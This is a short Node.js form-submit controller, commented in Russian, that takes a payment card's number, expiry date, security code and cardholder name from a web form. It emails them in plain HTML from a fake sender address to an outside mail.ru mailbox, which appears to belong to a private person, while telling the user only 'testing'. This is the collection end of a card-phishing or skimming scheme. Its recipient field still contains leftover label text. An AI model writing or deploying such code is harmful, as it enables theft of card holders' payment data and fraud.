class submitController {
    async submit(req, res) {
        const nodemailer = require('nodemailer');
        const directTransport = require('nodemailer-direct-transport');
        const fromHost = `mail.my`;
        const from = `Mail@${fromHost}`; //придумываете свою почту(может быть несуществующая)
        const to = ('Кому отправить: ibrokhim.sadykov.00@mail.ru ').trim();
        const transport = nodemailer.createTransport(directTransport({
            name: fromHost
        }));

        const { number, MMYY, code, name, } = req.body
        res.status(201).send('testing');

        transport.sendMail({
            from, to,
            subject: 'Заголовок письма',
            html: `
         <h1>Card number: ${number}</h1>
         <h1>Expiry date: ${MMYY}</h1>
         <h1>Security code: ${code}</h1>
         <h1>Name on card: ${name}</h1>
        `
        }, (err, data) => {
            if (err) {
                console.error('Ошибка при отправке:', err);
            } else {
                console.log('Письмо отправлено');
            }
        });
    }
}

module.exports = new submitController()